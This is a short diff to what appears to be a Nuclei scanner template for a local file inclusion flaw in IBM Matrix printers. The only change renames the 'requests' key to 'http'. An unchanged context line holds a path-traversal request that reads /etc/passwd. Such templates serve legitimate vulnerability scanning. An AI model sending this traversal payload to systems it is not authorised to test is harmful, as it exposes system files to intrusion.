@@ -8,7 +8,7 @@ info:
   reference: https://www.exploit-db.com/exploits/47835
   tags: ibm,lfi,matrix,printer
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/./../../../../../../../../../../etc/passwd'
